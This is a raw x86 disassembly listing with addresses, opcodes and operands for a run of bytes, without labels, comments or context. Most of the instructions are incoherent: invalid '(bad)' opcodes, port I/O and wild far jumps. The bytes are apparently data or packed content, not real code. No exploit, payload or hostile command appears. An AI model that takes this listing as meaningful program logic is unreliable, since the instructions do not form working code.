  4138b4:	sub    BYTE PTR [ebp+0xbf71],0x0
	...
  4138c7:	sbb    ch,0x1b
  4138ca:	mov    ah,0xd9
  4138cc:	inc    edx
  4138cd:	rol    BYTE PTR [esi],0x50
  4138d0:	adc    ah,BYTE PTR [ebp-0x1b06f2fc]
  4138d6:	add    esp,DWORD PTR [ebx-0x80]
  4138d9:	xor    al,0xf9
  4138db:	sub    eax,0x888ecb1e
  4138e0:	jmp    0x985eba05
  4138e5:	(bad)  
  4138e6:	mov    gs,WORD PTR [eax-0x9713f17]
  4138ec:	clc    
  4138ed:	in     al,0x3
  4138ef:	arpl   WORD PTR [esp+edx*8-0x21],di
  4138f3:	cmp    BYTE PTR [esp+ebp*4-0x21],bh
  4138f7:	sub    al,0x7c
  4138f9:	mov    esp,0x41ca5cdf
  4138fe:	icebp  
  4138ff:	fist   WORD PTR [ecx]
  413901:	mov    esp,0xed1e2406
  413906:	mov    ds,esi
  413908:	clc    
  413909:	(bad)  
  41390a:	in     al,dx
  41390b:	pusha  
  41390c:	add    eax,0x3fd59953
  413911:	out    0x5f,eax
  413913:	mov    DWORD PTR [ebx],edx
  413915:	(bad)  
  413916:	push   ds
  413917:	loop   0x41390e
  413919:	add    ebp,ecx
  41391b:	pusha  
  41391c:	mov    dh,bh
  41391e:	fisub  WORD PTR [edi+ebx*1]
  413921:	(bad)  
  413922:	call   0xc5bd0787
  413927:	lods   al,BYTE PTR ds:[esi]
  413928:	add    al,BYTE PTR [ebp+0x8]
	...
  41393a:	pusha  
  41393b:	add    eax,0xe5b46200
  413940:	push   ebx
  413941:	jb     0x41396d
  413943:	(bad)  
  413945:	ins    BYTE PTR es:[edi],dx
  413946:	arpl   di,di
  413948:	cmp    ch,BYTE PTR [esi-0x5974fc2f]
  41394e:	scas   eax,DWORD PTR es:[edi]
  41394f:	jle    0x413994
  413951:	or     eax,0x12ea7c53
  413956:	mov    bh,BYTE PTR [ecx-0x1ae49bb1]
  41395c:	cmp    ebx,DWORD PTR [eax]
  41395e:	(bad)  
  41395f:	inc    edx
  413960:	mov    BYTE PTR ds:0x17e7e543,dl
  413966:	fs paddd mm2,mm0
  41396a:	aam    0xe4
  41396c:	xor    ebx,DWORD PTR [ebx]
  41396e:	adc    edi,DWORD PTR [ebx+edx*2-0x33]
  413972:	xor    BYTE PTR [eax+0x28a97251],bh
  413978:	out    0x78,al
  41397a:	push   0xf
  41397c:	mov    al,BYTE PTR [ecx+0x2123c4d6]
  413982:	mov    dl,0xc0
  413984:	mov    ch,BYTE PTR [edi]
  413986:	inc    edi
  413987:	cmp    al,dh
  413989:	push   esi
  41398a:	dec    edx
  41398b:	retf   
  41398c:	les    esp,FWORD PTR [edx-0x45]
  41398f:	in     al,0x13
  413991:	add    BYTE PTR [esp+edx*1+0x395e4c89],ah
  413998:	mov    DWORD PTR [esi+ebx*2+0x35],edx
  41399c:	xchg   DWORD PTR [eax+eax*1+0x0],ecx
	...
  4139ac:	add    BYTE PTR [esi+0x31],bl
  4139af:	xchg   DWORD PTR [esi+ebp*4+0x38],edx
  4139b3:	mov    DWORD PTR [esi+ebx*4+0x14],eax
  4139b7:	push   ebp
  4139b8:	push   ebp
  4139b9:	jmp    0xfddb:0x6be8cc81
  4139c0:	call   DWORD PTR [ecx]
  4139c2:	cmp    eax,0x53ed3822
  4139c7:	mov    esi,ecx
  4139c9:	add    ecx,esp
  4139cb:	out    0xa3,al
  4139cd:	mov    ebp,ebp
  4139cf:	std    
  4139d0:	cmp    ecx,edi
  4139d2:	ja     0x413a0c
  4139d4:	mov    edi,DWORD PTR [esi]
  4139d6:	and    eax,0x2ffc3b36
  4139db:	add    al,BYTE PTR [eax]
  4139dd:	jp     0x413a5e
  4139df:	pop    es
  4139e0:	and    esp,0x1b
  4139e3:	add    al,BYTE PTR [eax]
  4139e5:	dec    edx
  4139e6:	add    al,0x74
  4139e8:	sbb    BYTE PTR [edi+0x4],dl
  4139eb:	add    eax,0x3783a00
  4139f0:	add    DWORD PTR ds:0x1719740a,0x4
  4139f7:	jge    0x4139f9
  4139f9:	cmp    bh,BYTE PTR [eax+0x3]
  4139fc:	adc    ebp,0x8
  4139ff:	je     0x413a0e
  413a01:	jge    0x413a5c
  413a03:	mov    esi,ecx
  413a05:	repnz loopne 0x4139f7
  413a08:	call   DWORD PTR [ebp+0x1aebfd39]
  413a0e:	sub    DWORD PTR [edx+0x24],0x0
	...
  413a1d:	add    BYTE PTR [eax],al
  413a1f:	add    dl,bh
  413a21:	push   cs
  413a22:	(bad)  
  413a23:	dec    DWORD PTR [edx]
  413a25:	add    al,0x8b
  413a27:	shl    DWORD PTR [ebx+0x3],cl
  413a2a:	xor    DWORD PTR [ecx-0x72],edx
  413a2d:	mov    ds:0xb7a4e748,eax
  413a32:	pop    ss
  413a33:	(bad)  
  413a34:	push   ds
  413a35:	fwait
  413a36:	daa    
  413a37:	add    BYTE PTR [esi-0x37],dl
  413a3a:	mov    DWORD PTR [ebx+0x7f],ebp
  413a3d:	mov    eax,DWORD PTR cs:[ebx-0x79]
  413a41:	push   edx
  413a42:	ret    
  413a43:	inc    edi
  413a44:	jmp    0x7d6:0x6857de51
  413a4b:	sub    ah,0xf5
  413a4e:	pop    ss
  413a4f:	(bad)  
  413a50:	out    0x6,al
  413a52:	or     BYTE PTR [edi+esi*8-0x1ffffde3],al
  413a59:	push   ss
  413a5a:	add    BYTE PTR [edi],cl
  413a5c:	fstp   QWORD PTR [edx-0x6c9cfffe]
  413a62:	(bad)  
  413a63:	and    edx,DWORD PTR [ebx-0x29]
  413a66:	mov    al,dl
  413a68:	cmp    BYTE PTR [edi-0x4d],bl
  413a6b:	push   eax
  413a6c:	fsubr  DWORD PTR [edi+0x2b]
  413a6f:	cs dec ebp
  413a71:	dec    eax
  413a72:	push   ss
  413a73:	mov    ch,BYTE PTR [edi-0x4ea923f8]
  413a79:	mov    ds:0x453b8a45,eax
  413a7e:	add    al,0xf1
  413a80:	cmp    al,0x68
  413a82:	fcmovb st,st(4)
	...
  413a90:	add    BYTE PTR [eax],al
  413a92:	add    BYTE PTR [ecx+ebp*8+0x3487438a],dh
  413a99:	fld    DWORD PTR [ebp+0x2287f]
  413a9f:	xchg   esi,eax
  413aa0:	adc    eax,0x284bbd81
  413aa5:	add    al,BYTE PTR [eax]
  413aa7:	arpl   WORD PTR [eax],dx
  413aa9:	cli    
  413aaa:	cmp    al,0x63
  413aac:	sub    DWORD PTR [edx],eax
  413aae:	add    BYTE PTR [edi+0x5],bh
  413ab1:	in     al,dx
  413ab2:	xor    ch,0x3
  413ab5:	aad    0xdf
  413ab7:	das    
  413ab8:	add    eax,0x916303d4
  413abd:	jecxz  0x413a41
  413abf:	fld    QWORD PTR [edx]
  413ac1:	mov    ebp,0x71b52dfb
  413ac6:	inc    esi
  413ac7:	les    edi,FWORD PTR [edi+esi*1-0x9e53ae9]
  413ace:	mov    eax,0x4c69ae19
  413ad3:	mov    ch,0xaf
  413ad5:	imul   eax,DWORD PTR [eax+0x74],0xd803f043
  413adc:	mov    eax,ds:0x42e9f3c4
  413ae1:	sar    DWORD PTR [esi],1
  413ae3:	and    al,0xb8
  413ae5:	jno    0x413b2d
  413ae7:	test   dh,ch
  413ae9:	push   es
  413aea:	pop    ss
  413aeb:	test   eax,ecx
  413aed:	imul   esp,DWORD PTR [edi],0x2ad39863
  413af3:	fs jp  0x413b2a
  413af6:	loopne 0x413af8
	...
  413b04:	add    BYTE PTR [eax],al
  413b06:	pop    esp
  413b07:	and    BYTE PTR [ecx],0x17
  413b0a:	adc    esi,DWORD PTR [ebx+0x6444561]
  413b10:	xlat   BYTE PTR ds:[ebx]
  413b11:	push   ss
  413b12:	push   ebp
  413b13:	jp     0x413b51
  413b15:	loopne 0x413ac7
  413b17:	push   eax
  413b18:	out    0x3,eax
  413b1a:	arpl   WORD PTR ds:0xe4b136f2,ax
  413b20:	jae    0x413b9c
  413b22:	xor    al,0xe
  413b24:	call   0xfcc8132c
  413b29:	jmp    DWORD PTR [esi+ecx*1]
  413b2c:	cmp    DWORD PTR [ecx+ebp*8+0x720903e],esi
  413b33:	push   cs
  413b34:	jge    0x413b3a
  413b36:	mov    ebp,0x60ecfff8
  413b3b:	add    eax,0x2f198c03
  413b40:	jno    0x413b8e
  413b42:	loope  0x413b7e
  413b44:	(bad)  
  413b45:	call   0xe94525c0
  413b4a:	pusha  
  413b4b:	or     BYTE PTR [edx-0x20],0xf3
  413b4f:	in     al,dx
  413b50:	mov    ch,BYTE PTR [edi-0x30]
  413b53:	add    DWORD PTR [eax],eax
  413b55:	jmp    0xed58c339
  413b5a:	pusha  
  413b5b:	add    eax,0xe9e66040
  413b60:	add    ebp,ecx
  413b62:	pusha  
  413b63:	jl     0x413aea
  413b65:	stc    
  413b66:	lods   al,BYTE PTR ds:[esi]
  413b67:	or     eax,0x62fe
	...
  413b78:	add    BYTE PTR [esi],ah
  413b7a:	test   BYTE PTR [ebx],0xe9
  413b7d:	pusha  
  413b7e:	jnp    0x413b8f
  413b80:	jmp    0x413bd4
  413b82:	adc    cl,al
  413b84:	jno    0x413b16
  413b86:	add    al,0x9e
  413b88:	aad    0x84
  413b8a:	or     eax,0x7a7f74fe
  413b8f:	test   ecx,edi
  413b91:	je     0x413ba0
  413b93:	(bad)  
  413b94:	jo     0x413b83
  413b96:	cmc    
  413b97:	add    ebp,ecx
  413b99:	pusha  
  413b9a:	lds    ecx,FWORD PTR [eax+0x95b5f]
  413ba0:	jmp    0xe550be8e
  413ba5:	pusha  
  413ba6:	add    eax,0x9476f8b
  413bab:	add    cl,ch
  413bad:	jmp    0x8746:0x4dbb01fc
  413bb4:	stc    
  413bb5:	popa   
  413bb6:	imul   ebx,DWORD PTR [ebx],0xffffffed
  413bb9:	pusha  
  413bba:	add    eax,0x82ebf075
  413bbf:	sldt   WORD PTR [esi]
  413bc2:	or     DWORD PTR [eax],eax
  413bc4:	mov    DWORD PTR [ecx+ecx*1+0x48fa0002],eax
  413bcb:	xchg   DWORD PTR [esi-0x1f2d2],ecx
  413bd1:	jae    0x413b5e
  413bd3:	push   cs
  413bd4:	add    al,0xfa
  413bd6:	or     BYTE PTR [ebx-0x1f30d7a],cl
  413bdc:	inc    DWORD PTR [eax]
	...
  413bea:	add    BYTE PTR [eax],al
  413bec:	call   0xfe0c:0xba868921
  413bf3:	inc    DWORD PTR [ecx+eax*1+0xd3c8b00]
  413bfa:	add    al,BYTE PTR [eax]
  413bfc:	retf   0x847d
  413bff:	sbb    dh,al
  413c01:	or     BYTE PTR [eax],al
  413c03:	add    DWORD PTR [ecx+edx*1],ebx
  413c06:	add    al,BYTE PTR [eax]
  413c08:	mov    edx,0xaad2cb1d
  413c0d:	jge    0x413c51
  413c0f:	and    al,0xbe
  413c11:	mov    edi,DWORD PTR [esi+0x4a7dcb74]
  413c17:	and    al,0xda
  413c19:	jge    0x413baf
  413c1b:	adc    BYTE PTR [esi+0x362b0008],al
  413c21:	and    eax,0x81f1514e
  413c26:	adc    al,BYTE PTR [edx+edi*2]
  413c29:	or     BYTE PTR [ebx],ch
  413c2b:	dec    esp
  413c2c:	push   cx
  413c2e:	push   eax
  413c2f:	push   ecx
  413c30:	jne    0x413c24
  413c32:	into   
  413c33:	add    DWORD PTR [esi],0x18
  413c36:	add    eax,0xffffff87
  413c39:	std    
  413c3a:	pop    esp
  413c3b:	mov    ecx,DWORD PTR [ecx]
  413c3d:	dec    ebp
  413c3e:	pop    ebp
  413c3f:	pop    esi
  413c40:	leave  
  413c41:	int3   
  413c42:	ss ret 0x162
  413c46:	mov    eax,DWORD PTR [esi-0x1f19d]
  413c4c:	sbb    al,0x47
  413c4e:	mov    esi,0x23
	...
  413c5f:	mov    bl,0xe1
  413c61:	mov    eax,0x3e9fad5e
  413c66:	aaa    
  413c67:	and    DWORD PTR [esi],esi
  413c69:	add    bh,BYTE PTR [eax+0x81e63]
  413c6f:	and    BYTE PTR [edi-0x6898dc42],dl
  413c75:	dec    edx
  413c76:	sar    dl,0x1e
  413c79:	test   DWORD PTR [ebx+0x6b],eax
  413c7c:	pop    esi
  413c7d:	aas    
  413c7e:	mov    bl,BYTE PTR [edi]
  413c80:	cli    
  413c81:	pop    es
  413c82:	cmp    DWORD PTR [edi+0x63fffff9],0x64744299
  413c8c:	popf   
  413c8d:	sub    ebx,DWORD PTR ds:[edi+0x1e]
  413c91:	add    al,bl
  413c93:	fcomp  DWORD PTR [ecx+0x1e5f43de]
  413c99:	add    cl,BYTE PTR [ebx+0x3c241f7]
  413c9f:	arpl   WORD PTR [esi],bx
  413ca1:	mov    cl,0x8a
  413ca3:	fild   WORD PTR [ecx-0x3e]
  413ca6:	add    esp,DWORD PTR [ebx+0x1e]
  413ca9:	mov    al,0x8a
  413cab:	xlat   BYTE PTR ds:[ebx]
  413cac:	inc    ecx
  413cad:	(bad)  
  413cae:	add    esp,DWORD PTR [ebx+0x1e]
  413cb1:	mov    bl,0x4f
  413cb3:	fsub   DWORD PTR [ecx+0x1e5f3fe7]
  413cb9:	add    dl,BYTE PTR [edx-0x4d]
  413cbc:	test   eax,0x347b23bf
  413cc1:	mov    bl,0xf4
	...
  413ccf:	add    BYTE PTR [eax],al
  413cd1:	add    BYTE PTR [esp+ecx*2-0x7c],cl
  413cd5:	ret    
  413cd6:	ja     0x413cf0
  413cd8:	add    al,BYTE PTR [eax]
  413cda:	and    BYTE PTR [ecx+0x3f],ch
  413cdd:	retf   
  413cde:	daa    
  413cdf:	push   es
  413ce0:	mov    ch,0x40
  413ce2:	sbb    BYTE PTR [edx],bh
  413ce4:	lods   al,BYTE PTR ds:[esi]
  413ce5:	inc    eax
  413ce6:	sbb    BYTE PTR [edx],bh
  413ce8:	cmp    edi,DWORD PTR [ebp+0x7]
  413ceb:	test   DWORD PTR [esp+edx*1+0x14],edi
  413cef:	or     ebp,eax
  413cf1:	mov    dh,0xb6
  413cf3:	mov    dl,0x71
  413cf5:	mov    ecx,0x391d45c
  413cfa:	mov    ch,0x56
  413cfc:	inc    eax
  413cfd:	ret    0x5a3
  413d00:	jo     0x413d16
  413d02:	and    ecx,DWORD PTR [esi]
  413d04:	jmp    0xf942ea0b
  413d09:	jl     0x413cde
  413d0b:	xchg   BYTE PTR [edi+0xb],al
  413d0e:	fs push edx
  413d10:	je     0x413d0f
  413d12:	xchg   esp,eax
  413d13:	mov    ebx,0x3dde03a7
  413d18:	in     eax,0x78
  413d1a:	xchg   ebx,eax
  413d1b:	cli    
  413d1c:	jbe    0x413d63
  413d1e:	fadd   st(1),st
  413d20:	add    edi,DWORD PTR [ecx+eiz*1]
  413d23:	xchg   BYTE PTR [ecx],ah
  413d25:	int3   
  413d26:	sub    BYTE PTR [edi+edx*8],dh
  413d29:	xor    eax,0xff8b8606
  413d2e:	arpl   WORD PTR [eax+0x129c7cf2],dx
  413d34:	and    BYTE PTR [ecx+0x0],al
	...
  413d42:	add    BYTE PTR [eax],al
  413d44:	add    BYTE PTR [eax],bl
  413d46:	add    eax,0x78611ed7
  413d4b:	fdivr  st(5),st
  413d4d:	out    0x8c,eax
  413d4f:	out    0x86,eax
  413d51:	ror    BYTE PTR [eax-0x8],0x12
  413d55:	gs or  ch,al
  413d58:	xchg   BYTE PTR [eax],al
  413d5a:	js     0x413d54
  413d5c:	adc    dl,BYTE PTR [ebp+0xa]
  413d5f:	call   0x773b6738
  413d64:	test   DWORD PTR [ebx+edi*4],esp
  413d67:	jmp    DWORD PTR [edi]
  413d69:	addr16 js 0x413d9f
  413d6c:	rcr    ebp,1
  413d6e:	pop    es
  413d6f:	sbb    esp,DWORD PTR [ebp*1+0x68d4437c]
  413d76:	add    BYTE PTR [ebx-0xc],0x90
  413d7a:	pop    ds
  413d7b:	pop    es
  413d7c:	arpl   WORD PTR [ecx+edx*8],bx
  413d7f:	stos   DWORD PTR es:[edi],eax
  413d80:	jno    0x413da6
  413d82:	jmp    0xf1d6816
  413d87:	sbb    esi,ebp
  413d89:	dec    edi
  413d8a:	dec    edi
  413d8b:	sbb    ebp,ecx
  413d8d:	pusha  
  413d8e:	add    eax,0x29e69f0f
  413d93:	dec    ebp
  413d94:	test   al,0x60
  413d96:	js     0x413dcb
  413d98:	icebp  
  413d99:	in     eax,0x7
  413d9b:	aaa    
  413d9c:	int3   
  413d9d:	(bad)  
  413d9e:	jnp    0x413de3
  413da0:	cld    
  413da1:	mov    BYTE PTR [edx+0x1f50dc43],al
  413da7:	pop    es
  413da8:	arpl   WORD PTR [eax],ax
	...
  413db6:	add    BYTE PTR [eax],al
  413db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413db9:	shr    BYTE PTR [ebx-0x7017639f],1
  413dbf:	stos   BYTE PTR es:[edi],al
  413dc0:	in     eax,0xe
  413dc2:	aaa    
  413dc3:	popf   
  413dc4:	ja     0x413d9b
  413dc6:	(bad)  
  413dc8:	cmp    al,BYTE PTR [edi+0x99f9fef]
  413dce:	jle    0x413d55
  413dd0:	pop    ebx
  413dd1:	jne    0x413dd2
  413dd3:	je     0x413e37
  413dd5:	jle    0x413dda
  413dd7:	push   esp
  413dd8:	mov    eax,0x77e940b7
  413ddd:	test   DWORD PTR [ecx+edi*8-0x1101f4ad],ecx
  413de4:	or     al,BYTE PTR [edi+0x9202607]
  413dea:	jle    0x413e39
  413dec:	pop    esp
  413ded:	jne    0x413dee
  413def:	dec    DWORD PTR [esi-0x58fb74fd]
  413df5:	dec    ecx
  413df6:	dec    esp
  413df7:	inc    ecx
  413df8:	dec    edx
  413df9:	or     al,0x82
  413dfb:	mov    ebp,0xfffdf61a
  413e00:	jns    0x413d84
  413e02:	stc    
  413e03:	sbb    BYTE PTR [esi-0x41],al
  413e06:	inc    eax
  413e07:	xor    eax,0x11
  413e0a:	or     eax,0xfdf6308c
  413e0f:	call   DWORD PTR [edi-0x7a00f180]
  413e15:	test   BYTE PTR [esi-0x18],0x3
  413e19:	add    eax,0x0
	...
  413e2a:	add    BYTE PTR [ebp+0x53],ah
  413e2d:	pop    ecx
  413e2e:	mov    DWORD PTR [esi-0x5f73fa8],edx
  413e34:	dec    edi
  413e35:	xchg   ebp,esp
  413e37:	dec    ebx
  413e38:	in     eax,0x7e
  413e3a:	add    dl,cl
  413e3c:	add    al,0x53
  413e3e:	push   esi
  413e3f:	in     eax,dx
  413e40:	mov    DWORD PTR [ebx+0x8],eax
  413e43:	aaa    
  413e44:	push   eax
  413e45:	jle    0x413e00
  413e47:	call   0x81c2:0x43000004
  413e4e:	sar    BYTE PTR [esi+0x5c813189],0x1
  413e55:	add    ah,bh
  413e57:	mov    al,bl
  413e59:	in     al,0x6
  413e5b:	add    DWORD PTR [edx],edi
  413e5d:	jg     0x413e46
  413e5f:	cmp    al,BYTE PTR [esi]
  413e61:	add    BYTE PTR [eax],al
  413e63:	cmp    ebx,esi
  413e65:	or     BYTE PTR [ecx],cl
  413e67:	je     0x413df2
  413e69:	sbb    DWORD PTR ss:[ebp+0x1],0xc37afc00
  413e71:	in     eax,dx
  413e72:	or     dh,BYTE PTR [ebx-0xa]
  413e75:	xchg   DWORD PTR [edx],esi
  413e77:	arpl   WORD PTR [ebp+0x22218238],sp
  413e7d:	jnp    0x413eb6
  413e7f:	loop   0x413eb7
  413e81:	inc    edx
  413e82:	push   cs
  413e83:	arpl   WORD PTR [esi],bx
  413e85:	inc    ecx
  413e86:	out    dx,al
  413e87:	gs and edx,eax
  413e8a:	mov    BYTE PTR [ebp-0x5d],dh
  413e8d:	rol    DWORD PTR [eax+0x0],cl
	...
  413e9b:	add    BYTE PTR [eax],al
  413e9d:	add    BYTE PTR [ebp+0x1e],al
  413ea0:	adc    al,BYTE PTR [edx]
  413ea2:	arpl   WORD PTR [ebp+0x28],bx
  413ea5:	or     ebp,eax
  413ea7:	adc    al,BYTE PTR [ebx+0x235d54e2]
  413ead:	cvtps2pd xmm4,QWORD PTR [eax+0x7b]
  413eb1:	pop    ss
  413eb2:	loop   0x413f2e
  413eb4:	add    dh,al
  413eb6:	pusha  
  413eb7:	push   ds
  413eb8:	inc    ecx
  413eb9:	jmp    0x9531:0x8830255f
  413ec0:	xor    eax,DWORD PTR [edx+0x2f7b2221]
  413ec6:	loopne 0x413e7f
  413ec8:	iret   
  413ec9:	or     dl,BYTE PTR [eax-0x1fb72c5b]
  413ecf:	fld    QWORD PTR [esi]
  413ed1:	test   DWORD PTR [edx+0x268c8850],ebx
  413ed7:	sahf   
  413ed8:	mov    dl,0xe7
  413eda:	jl     0x413efa
  413edc:	add    al,BYTE PTR [eax]
  413ede:	or     al,0x40
  413ee0:	stos   DWORD PTR es:[edi],eax
  413ee1:	mov    BYTE PTR [edi+0x63034448],dh
  413ee7:	mov    ds:0xb45f23c6,eax
  413eec:	bound  ecx,QWORD PTR [ebx+0x22]
  413eef:	push   ds
  413ef0:	jnp    0x413efb
  413ef2:	ficom  DWORD PTR ds:0x9b67c183
  413ef8:	inc    edx
  413ef9:	add    esp,edx
  413efb:	adc    esp,ecx
  413efd:	dec    esp
  413efe:	and    al,BYTE PTR ds:0x91e9
	...
  413f10:	add    BYTE PTR [esi+0x42],dh
  413f13:	in     al,0x3
  413f15:	call   0x19494bdb
  413f1a:	data16 sbb al,0xc5
  413f1d:	dec    esp
  413f1e:	jl     0x413f10
  413f20:	jl     0x413f7c
  413f22:	sub    BYTE PTR [eax-0x13bc1ff8],0x84
  413f29:	cmp    ah,dh
  413f2b:	sbb    eax,ebp
  413f2d:	sub    al,0x95
  413f2f:	xchg   esi,eax
  413f30:	inc    edx
  413f31:	pusha  
  413f32:	add    eax,0xb6077d34
  413f37:	cmp    BYTE PTR [ebx+0x7ae0c0e9],dh
  413f3d:	scas   eax,DWORD PTR es:[edi]
  413f3e:	stc    
  413f3f:	jae    0x413efa
  413f41:	or     al,0xb4
  413f43:	sbb    BYTE PTR [ebx*2-0x74fc16fb],bl
  413f4a:	gs sbb al,0xc5
  413f4d:	in     al,dx
  413f4e:	jns    0x413efb
  413f50:	or     edx,DWORD PTR [ebp+ebx*1+0x563042f]
  413f57:	mov    edx,0xb80d1f80
  413f5c:	sbb    edi,DWORD PTR [eax*1+0x7c2803e9]
  413f63:	dec    esp
  413f64:	mov    cl,0xa2
  413f66:	std    
  413f67:	call   0x503291e
  413f6c:	cld    
  413f6d:	fnstenv [ecx+0x44dbffcc]
  413f73:	test   al,0xfe
	...
  413f81:	add    BYTE PTR [eax],al
  413f83:	add    dh,dl
  413f85:	cld    
  413f86:	daa    
  413f87:	and    eax,0x7ce27c6c
  413f8c:	mov    ds:0x5b55f5c5,eax
  413f91:	inc    esp
  413f92:	pop    es
  413f93:	hlt    
  413f94:	imul   edi,ebx,0x7d795fff
  413f9a:	shr    BYTE PTR [ecx-0x57f7af93],0x3f
  413fa1:	dec    BYTE PTR [edx]
  413fa3:	repz (bad) 
  413fa6:	mov    BYTE PTR [eax+0x600343e1],bh
  413fac:	mov    eax,ds:0x397f0ec6
  413fb1:	std    
  413fb2:	sbb    BYTE PTR [eax-0x59],dh
  413fb5:	(bad)  
  413fb6:	push   cs
  413fb7:	jg     0x413ff0
  413fb9:	inc    ebp
  413fba:	loopne 0x413f8d
  413fbc:	scas   eax,DWORD PTR es:[edi]
  413fbd:	cld    
  413fbe:	mov    BYTE PTR [eax-0xf4a08e0],ch
  413fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fc5:	and    eax,0x7d1ae20f
  413fca:	or     DWORD PTR [eax-0x59],esp
  413fcd:	(bad)  
  413fce:	push   cs
  413fcf:	aas    
  413fd0:	pop    es
  413fd1:	inc    ebp
  413fd2:	loopne 0x413fc5
  413fd4:	stc    
  413fd5:	sti    
  413fd6:	push   cs
  413fd7:	aas    
  413fd8:	pusha  
  413fd9:	cld    
  413fda:	shl    BYTE PTR [eax-0x16],0xaa
  413fde:	shl    ecx,0x60
  413fe1:	mov    dl,0x8a
  413fe3:	mov    ch,0xc4
  413fe5:	std    
  413fe6:	mov    ah,BYTE PTR [ebp+0x0]
	...
  413ff4:	add    BYTE PTR [eax],al
  413ff6:	add    BYTE PTR [ecx+edi*8+0x1e27eb8a],bh
  413ffd:	pop    ss
  413ffe:	jno    0x41405f
  414000:	les    ecx,FWORD PTR [edx+0xf1e27eb]
  414006:	popa   
  414007:	pop    edi
  414008:	les    ecx,FWORD PTR [edx+0x71e27eb]
  41400e:	jno    0x41406f
  414010:	les    ecx,FWORD PTR [eax-0x308358ce]
  414016:	push   0x22
  414018:	add    cl,BYTE PTR [ebx-0x74fcf717]
  41401e:	add    BYTE PTR [eax-0x40],bh
  414021:	out    0x18,al
  414023:	repnz add BYTE PTR [ecx-0x75],al
  414027:	mov    al,al
  414029:	out    0x10,al
  41402b:	add    al,BYTE PTR [ecx]
  41402d:	inc    ecx
  41402e:	mov    edi,DWORD PTR [eax-0x3e]
  414031:	out    0x8,al
  414033:	ror    BYTE PTR [eax],cl
  414035:	aas    
  414036:	mov    ebx,DWORD PTR [eax-0x7f]
  414039:	int    0x88
  41403b:	cmp    ebp,DWORD PTR [esi-0x43c5f741]
  414041:	mov    ch,ah
  414043:	leave  
  414044:	and    eax,0xba545309
  414049:	mov    al,BYTE PTR [ebp+0xe]
  41404c:	jle    0x4140a2
  41404e:	or     BYTE PTR [ecx+0x124d8af7],dh
  414054:	jle    0x41409e
  414056:	add    al,0x83
  414058:	ss shr bl,0x0
	...
  414068:	add    BYTE PTR [eax],al
  41406a:	push   es
  41406b:	fmul   st,st(2)
  41406d:	sbb    ecx,0xd0f0f02
  414073:	fcomp  st(0)
  414075:	mov    esp,ecx
  414077:	dec    eax
  414078:	jecxz  0x41407e
  41407a:	stos   DWORD PTR es:[edi],eax
  41407b:	push   ss
  41407c:	mov    dh,dl
  41407e:	cmp    esp,DWORD PTR [ebx]
  414080:	or     eax,0xf2808c31
  414085:	sub    DWORD PTR [ecx],0xba00fe12
  41408b:	xlat   BYTE PTR ds:[ebx]
  41408c:	fmul   DWORD PTR [ecx+0x10e3487c]
  414092:	mov    ebx,0x8bce8816
  414097:	and    edi,edi
  414099:	xor    BYTE PTR [eax+eax*4-0xe],dl
  41409d:	sbb    DWORD PTR [ecx-0x2a],0xd7b93332
  4140a4:	xlat   BYTE PTR ds:[ebx]
  4140a5:	mov    DWORD PTR [ebx+0x3c],esp
  4140a8:	inc    ecx
  4140a9:	in     eax,0x61
  4140ab:	fst    QWORD PTR [edx]
  4140ad:	mov    BYTE PTR [ebp+0x32071e2d],dl
  4140b3:	sbb    al,0x79
  4140b5:	repnz loop 0x4140c7
  4140b8:	or     edi,edi
  4140ba:	ins    DWORD PTR es:[edi],dx
  4140bb:	out    dx,al
  4140bc:	rcr    cl,cl
  4140be:	fcmove st,st(4)
  4140c0:	inc    edx
  4140c1:	in     eax,0x6b
  4140c3:	sbb    eax,0xdace883e
  4140c8:	add    dh,dh
  4140ca:	fcom   DWORD PTR [eax+0x10]
  4140cd:	rol    BYTE PTR [eax],0x0
	...
  4140dc:	add    BYTE PTR [ebx+ebp*8],dh
  4140df:	and    dh,0x62
  4140e2:	jne    0x4140f6
  4140e4:	or     BYTE PTR [edx],bh
  4140e6:	xor    esi,DWORD PTR gs:[eax]
  4140e9:	sbb    eax,0x40801065
  4140ee:	pop    eax
  4140ef:	push   edi
  4140f0:	test   eax,0x3027dcc9
  4140f5:	cmp    ch,BYTE PTR [ecx-0x2b]
  4140f8:	adc    edx,ebx
  4140fa:	mov    edx,0x6f64ee42
  4140ff:	and    al,0x0
  414101:	jmp    0xc31:0x1cf9fa7f
  414108:	pop    es
  414109:	arpl   si,bp
  41410b:	add    DWORD PTR [ecx+0x1b232d15],ecx
  414111:	jmp    0x1065:0x5fee4232
  414118:	or     al,cl
  41411a:	fs inc ebx
  41411c:	and    BYTE PTR [ebx-0x15e22f0f],0x23
  414123:	and    ch,0x74
  414126:	addr16 aad 0xb4
  414129:	sbb    DWORD PTR [ecx+0x4dbffc2],0x46
  414130:	inc    edx
  414131:	lea    ecx,[edx]
  414133:	push   0xe7049824
  414138:	add    ebx,DWORD PTR [eax-0x44]
  41413b:	(bad)  
  41413c:	mov    al,0x23
  41413e:	add    eax,0x2c70
	...
  41414f:	add    BYTE PTR [ebx+0x7d82edf3],ah
  414155:	add    al,ch
  414157:	add    esp,DWORD PTR [ebx+0x10]
  41415a:	ss jecxz 0x414170
  41415d:	inc    esi
  41415e:	out    0x7c,eax
  414160:	cmp    eax,0xe3f2cec5
  414165:	jmp    0x52e2:0x56304d3
  41416c:	fs push edx
  41416e:	sub    BYTE PTR [edx+ebp*8],al
  414171:	js     0x414126
  414173:	jge    0x414193
  414175:	xchg   DWORD PTR [edi-0x5312600],esp
  41417b:	jmp    0x22ac255b
  414180:	pop    ebp
  414181:	mov    ss,ebx
  414183:	push   eax
  414184:	je     0x4141e1
  414186:	sub    BYTE PTR [eax+ebx*2],al
  414189:	js     0x41411e
  41418b:	jge    0x4141b2
  41418d:	lds    edx,FWORD PTR [esi+0x7beae202]
  414193:	add    al,0x63
  414195:	add    eax,0x594c52e2
  41419a:	sub    BYTE PTR [edx+ebx*8],al
  41419d:	loop   0x4141c7
  41419f:	sbb    ebp,DWORD PTR [esi-0x7c]
  4141a2:	inc    esi
  4141a3:	or     ah,dl
  4141a5:	add    ch,al
  4141a7:	(bad)  
  4141a8:	adc    eax,0xc4c4b926
  4141ad:	lea    esp,[esi]
  4141af:	inc    ebp
  4141b0:	int    0x1b
  4141b2:	push   0x23
	...
  4141c3:	mov    eax,0x60e90005
  4141c8:	push   cs
  4141c9:	mov    ch,0x9
  4141cb:	out    dx,eax
  4141cc:	inc    ebp
  4141cd:	add    al,bl
  4141cf:	jbe    0x41415e
  4141d1:	(bad)  
